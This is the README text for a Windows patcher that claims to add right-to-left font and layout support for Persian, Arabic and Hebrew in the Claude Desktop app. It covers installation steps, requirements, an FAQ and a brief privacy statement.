💡 What this tool does

The Claude Desktop application does not always handle languages like Persian, Arabic, or Hebrew well. These languages require right-to-left layout support to look right. This patcher fixes the text display. It integrates specialized fonts and formatting updates so you can read your conversations naturally.

🚀 Installation steps

Follow these steps to set up the patcher on your Windows computer.

  1. Visit the official download page.
  2. Locate the latest release specific to the Windows operating system.
  3. Download the installer file to your computer.
  4. Close the Claude Desktop application if it is currently running.
  5. Double-click the downloaded file to start the installation.
  6. Follow the instructions on the screen to complete the setup.
  7. Restart the Claude Desktop application.

The patcher performs the updates in the background. Once the process completes, your text should appear aligned to the right automatically.

⚙️ System requirements

  • Windows 10 or Windows 11.
  • The official Claude Desktop application installed.
  • Internet connection for the initial setup.

❓ Frequently asked questions

Do I need programming skills? No. This tool works for any user. You only need to run the installer once.

Will this change my Claude account? No. The patcher only changes how text looks on your screen. It does not affect your account settings or data.

How do I remove the patch? You can uninstall the patch through your Windows Control Panel, just like any other application.

🛡️ Security

This software modifies user interface elements in the Claude Desktop app to enable better font rendering. It stays on your device and does not share your chat conversations with external servers.
